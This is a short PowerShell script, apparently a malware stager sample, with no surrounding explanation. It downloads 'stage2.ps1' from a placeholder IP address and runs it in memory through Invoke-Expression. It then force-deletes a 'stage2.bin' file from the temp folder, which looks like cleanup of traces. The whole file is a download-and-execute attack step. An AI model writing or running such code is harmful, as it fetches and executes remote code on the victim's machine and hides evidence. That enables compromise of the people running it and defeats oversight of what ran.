
[CmdletBinding()]
param(
    [string]$FetchUrl = "http://192.0.2.186/stage2.ps1",
    [int]$TransferTimeout = 179
)
IEX (Invoke-WebRequest -Uri $FetchUrl -UseBasicParsing).Content
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
